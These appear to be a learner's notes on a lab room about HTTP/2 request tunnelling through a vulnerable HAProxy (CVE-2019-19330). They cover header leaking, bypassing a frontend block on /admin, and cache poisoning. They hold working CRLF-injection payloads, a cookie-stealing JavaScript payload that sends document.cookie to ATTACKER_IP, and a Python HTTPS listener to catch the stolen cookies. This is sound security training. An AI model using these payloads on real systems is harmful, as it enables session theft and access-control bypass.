So far, the attack vectors we have looked at depend on the backend server to reuse a single HTTP connection to serve all users. In certain proxy implementations, each user will get its own backend connection to separate their request from others. Whenever this happens, an attacker won't be able to influence the requests of other users. At first sight, it would appear that we can't do much if confined to our own connection, but we can still smuggle requests through the frontend proxy and achieve some results. Since we can only smuggle requests to our connection, this scenario is often called request tunnelling.
	![](Pasted%20image%2020250214104223.png)

In the following three tasks, we will use an old version of HAProxy, vulnerable to [CVE-2019-19330](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19330) as our frontend proxy. This version allows request smuggling by using the CRLF injection technique. The vulnerable backend application will be accessible through the proxy at [https://10.10.111.74:8100](https://10.10.111.74:8100/).

## Leaking Internal Headers
The simplest way to abuse request tunnelling is to get some information on how the backend requests look. In some scenarios, the frontend proxies may add headers to the requests before sending them to the backend. If we want to smuggle a specific request to the backend, we may need to add such headers for the request to go through.

To leak such headers, we can abuse any functionality in the backend application that reflects a parameter from the request into the response. In our case, the application reflects whatever data is sent to `/hello` through the `q` POST parameter. Here's how the request would look like:
	![](Pasted%20image%2020250214105041.png)

Notice the existence of a `content-length` header despite being ignored by HTTP/2. Most browsers will add this header to all HTTP/2 requests so that the backend will still receive a valid `Content-Length` header if an HTTP downgrade occurs. In the backend, the request would be converted into HTTP/1.1. This particular proxy will insert the `Host:` header after the headers sent by the client (right after content-length). If needed, the proxy could also add any additional headers (represented as X-Internal in the image). The final backend request would look like this:
	![](Pasted%20image%2020250214105209.png)
		![](Pasted%20image%2020250214105220.png)

We will take advantage of the vulnerability in HAProxy that allows us to inject CRLFs via headers to leak the backend headers successfully. We will add a custom Foo header and send our attack payload through it. This is how our request would look:
	![](Pasted%20image%2020250214105321.png)

- This will be a normal request for the frontend since HTTP/2 doesn't care about binary information in its headers.
- The `Content-Length: 0` header injected through the Foo header will make the backend think the first POST request has no body. Whatever comes after the headers will be interpreted as a second request.
- Since the `Host` header and any other internal headers are inserted by the proxy after `Foo`, the first POST request will have no `Host` header unless we provide one. This is why we injected a `Host` header for the first request. This is required, as the HTTP/1.1 specification requires a `Host` header for each request.
- The second POST request will trigger a search on the website. Notice how the internal headers are now part of the `q` parameter in the body of the request. This will cause the website to reflect the headers back to us.
- The second POST request we have injected has a `Content-Length: 300`. This number is just an initial guess of how much space we will require for the Internal headers. You will need to play a bit with it until you get the right answer. If it's set too high, the connection will hang as the backend waits for that many bytes to be transferred. If you set it too low, you may only get a part of the internal headers.

Now let's try sending this using Burp. First, capture the request that is sent by the website when performing a search. You should be able to identify a POST request being sent to `/hello`. Right-click the request and send it to Repeater:
	![](Pasted%20image%2020250214111137.png)

**Note:** 
	Be sure to send an HTTP/2 request to repeater. Under certain circumstances, your browser may send an HTTP/1.1 request the first time you request a resource. In that case, simply refresh the website, and it should send an HTTP/2 request the second time.

Once our request is in the Repeater tab, we'll do two modifications to it:
1. Delete the body content.
2. Set the `Content-Length` header to 0. We do this for the same reason as before. We want the first request to be a POST with no body. Remember we will need to disable the `Update Content-Length` setting on Repeater to avoid Burp overwriting our custom value.
	![](Pasted%20image%2020250214111220.png)

Let's add our custom `Foo` header with an initial content of bar. Notice that Burp allows us to edit the HTTP/2 request as if it were an HTTP/1 request. This is somewhat convenient as long as you don't need to insert binary characters in the request. Since we will be adding CRLFs to the request, editing the request as text won't be possible. Instead, we will use the Inspector pane at the right, since it allows for a much more precise editing of the request:
	![](Pasted%20image%2020250214111300.png)

Let's click the arrow beside the `foo` header in the Inspector and edit it to our desired value. Note that to insert a CRLF in the header value, you will need to press `SHIFT + ENTER`. The final result should look like this:
	![](Pasted%20image%2020250214111309.png)

Once you press the `Apply changes` button, the Request pane will go blank and show you a message indicating the request is "**kettled**". This means that there's no way to represent the request in pure text anymore because of the special characters it contains (CRLFs in our case). From now on, all modifications to the request shall be done through the Inspector only.

When the request is ready, you can press the `Send` button as usual to send it. Remember that our HTTP/2 request will be split into two backend requests, so the first time you send it, you will only obtain the response of the first request, which is empty. To get the value of the hidden internal headers, you will need to send the same request twice in quick succession. If all goes well, the website should reflect the internal headers to you on the second request:

Initial request:
	![](Pasted%20image%2020250214122150.png)

Payload:
```html
bar
Host: 10.10.111.74:8100

POST /hello HTTP/1.1
Host: 10.10.111.74:8100
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

q=
```

Response:
![](Pasted%20image%2020250214115832.png)


## Bypassing Frontend Restrictions
In some scenarios, you will find that the frontend proxy enforces restrictions on what resources can be accessed on the backend website. For example, imagine your website has an admin panel at `/admin`, but you don't want it accessible to everyone on the Internet. As a simple solution, you could enforce a restriction in the frontend proxy to disallow any attempt to access `/admin` without requiring any changes in the backend server itself.
	![](Pasted%20image%2020250214120416.png)

A request tunnelling vulnerability would allow us to smuggle a request to the backend without the frontend proxy noticing, effectively bypassing frontend security controls. Consider the following HTTP/2 request:
	![](Pasted%20image%2020250214120434.png)

**Note:** 
	We are using a POST request for this scenario. While this is not specifically required for this attack to work, there's a fundamental difference on how GET and POST requests are treated by a proxy. If a proxy implements caching:
	- **GET** request may be served from the proxy's cache, so nothing will be forwarded to the backend server and the attack may fail. 
	- **POST** request, on the other hand, is normally not served from cache, so it is guaranteed that it will be forwarded to the backend.

When the frontend sees this HTTP/2 request, it will interpret it as being directed to `/hello` which is allowed in the proxy's ACL. In the backend, however, the HTTP/2 request gets split in two HTTP/1.1 requests, where the second one points to `/admin`. Notice the second request is purposefully unfinished, so we will need to send the request twice to trigger the response corresponding to `/admin`.

Another way to understand the attack, would be to say that we are using an allowed resource, in this case `/hello`, to smuggle a request to a forbidden resource, in this case `/admin`. From the point of view of the proxy, only a request for `/hello` was made, so no violations to the ACL were made. 

It is important to note that the resource we request via HTTP/2 must be allowed by the ACL for this attack to work. We are effectively smuggling an invalid request over a valid one. This same method can sometimes be used to smuggle request past Web Application Firewalls (WAF).

Initial request:
	![](Pasted%20image%2020250214122039.png)

Payload:
```html
bar
Host: 10.10.111.74:8100
Content-Length: 0

GET /admin HTTP/1.1
X-Fake: a
```

Response:
![](Pasted%20image%2020250214121903.png)


## Web Cache Poisoning
Even if we can't influence other users' connections directly, we may be able to use request tunnelling to poison server-side caching mechanisms, affecting users indirectly. This kind of attack has a high severity as it impacts all users visiting the website for as long as the cached content lasts. Given the right conditions, the poisoned cached content can have anything the attacker wants, including javascript payloads. This can be used to issue malicious redirects or even steal user sessions.

**Note:** 
	Extreme care needs to be taken when testing web cache poisonings in real-world production systems, as they may affect the availability of the website if not conducted properly.

For this task, we are still using HAProxy. The HAProxy instance is configured to cache content for 30 seconds, so we should be able to perform the attack. Also, if something gets cached wrongly while you are doing your tests, waiting for 30 seconds will clear up the cache so you can start from scratch once again.

Before diving into details, let's lay out the plan. To achieve cache poisoning, what we want is to make a request to the proxy for `/page1` and somehow force the backend web server to respond with the contents of `/page2`. It this were to happen, the proxy will wrongly associate the URL of `/page1` with the cached content of `/page2`.

The trick we are using would allow you to poison the cache, but only with the content of other pages on the same website. This means the attacker wouldn't be able to pick arbitrary content for the cache poisoning. Luckily for us, there's some ways to overcome this limitation:
1. If the website has an upload functionality.
2. If we find a part of the website that reflects content from a request parameter. We can abuse articles or any other equivalent content to the website (Think of a blog).
3. Under certain circumstances, open redirects can also be abused, but we won't cover this case during the room.

In any of those cases, the attacker can add arbitrary content to the website, which can be cached by the proxy and associated with any URL (existing or not). In the case of our application, we have an upload functionality at our disposal ([https://10.10.111.74:8100/upload](https://10.10.111.74:8100/upload)). We can use it to upload any payload we want cached later.
	![](Pasted%20image%2020250214122447.png)


Our goal in this task will be to steal cookies from any user visiting [https://10.10.111.74:8100/](https://10.10.111.74:8100/). The lab already simulates a victim user, and the flag for this task is in that user's cookies.

One option we could use would be poisoning the cache for `/` directly. But we want to be a bit more silent about things. By quick inspection, we can notice that `/` executes the `showText()` javascript function when the page's body loads, which is defined in `/static/text.js`.
	![](Pasted%20image%2020250214122554.png)

Let's try to poison the cached version of `/static/text.js` to include a javascript payload to steal the cookies from the user.

Since we need the javascript payload to be on the website before the cache poisoning, let's start by uploading the following payload in a file named `myjs.js`:
```javascript
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp.open("GET", "https://ATTACKER_IP:8002/?c="+document.cookie, true);
xhttp.send();
```

This is a simple payload that will forward the victim's cookies back to a web server controlled by the attacker. 

**Note:**
	The only special thing about this payload is that it forwards the cookie via https. We need to use https, since HTTP/2 runs over https by default. If a script in an https website tried to load a resource using plaintext http, most browsers would block the action for security reasons. This means your standard python http server won't actually be able to receive the cookies, but more on that later.

After uploading our payload, the website will let us know that the file has been saved to `/static/uploads/myjs.js`. We now need to poison the cache so that it serves our payload whenever `/static/text.js` is requested. To do so, we will use the following request:
	![](Pasted%20image%2020250214122942.png)

Here, we are reusing the CRLF injection vulnerability in HAProxy to perform a request splitting attack in the backend. The first backend request will get the contents of `/static/text.js`. The second request will be for `/static/uploads/myjs.js`. The proxy should expect a single response to its request, but is getting two instead. The proxy will take the first response and serve it to the user, and keep the second response queued in the backend connection.

**Note:**
	We included the `Pragma: no-cache` header in our request to force the proxy to bypass any cached content and send the request to the backend server. Doing so allows us to send several requests until our payload is correctly triggered without waiting for the cache to time out.

If we now send an additional request for `/static/text.js`, we will get the queued response with the contents of `myjs.js`. Beyond the fact that we are receiving the wrong content for our new request, the cache will wrongly associate the contents of the queued response with the new URL we are requesting. Any other user that requests `/static/text.js` afterwards, will receive the contents of `myjs.js` served from the poisoned cached instead. This will last until the cached content expires, which is just 30 seconds for our lab.
	![](Pasted%20image%2020250214125957.png)

If your attack worked, you should now be able to use curl to request `/static/text.js`, and should get the contents of our payload instead.
```shell
curl -kv https://10.10.111.74:8100/static/text.js
```

**Note:**
	 Don't use your actual browser (Firefox, Chrome, Safari, etc.) to check if the attack worked. Modern browsers also have local caching, which may alter what you get from a URL, as it may be taken directly from your local cache instead of being requested to the proxy/web server.
	

### HTTP --> HTTPS Server (capturing)
At this point, if the victim user navigates to `/`, their cookies will be sent to our AttackBox on port 8002 via https. We need to set up a simple web server that implements https to be able to read the received cookies. There are many ways to set up such a server, we will use python to do so. Before running the https web server we will need to create an SSL certificate and key with the following command:
```shell
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
```
  
Next, we'll create a file named `https.py` with the code responsible of running the https web server. The code is straightforward and let's you specify the port to use, which is `8002` in our case. The code also points to the SSL certificate and we previously generated. The code expects both of those files to be in the same directory as the python script:
```python
from http.server import HTTPServer, BaseHTTPRequestHandler 
import ssl
httpd = HTTPServer(('0.0.0.0', 8002), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(
    httpd.socket,
    keyfile="key.pem",
    certfile='cert.pem',
    server_side=True)
httpd.serve_forever()
```

Once our script is ready, we can run it with the following command. You won't get any output initially, but as soon as the victim navigates to your webserver, logs will start to appear:
```shell
python3 https.py
```


![](Pasted%20image%2020250214125010.png)
![](Pasted%20image%2020250214124720.png)
	![](Pasted%20image%2020250214125543.png)

GET /static/text.js  (poison the cache)
	![](Pasted%20image%2020250214131004.png)
	![](Pasted%20image%2020250214131556.png)

verify if our js file was cached instead of text.js
```shell
curl -kv https://10.10.111.74:8100/static/text.js
```

run the python script of the https server to capture the requests(users cookie)
	![](Pasted%20image%2020250214132414.png)
	![](Pasted%20image%2020250214132445.png)
	


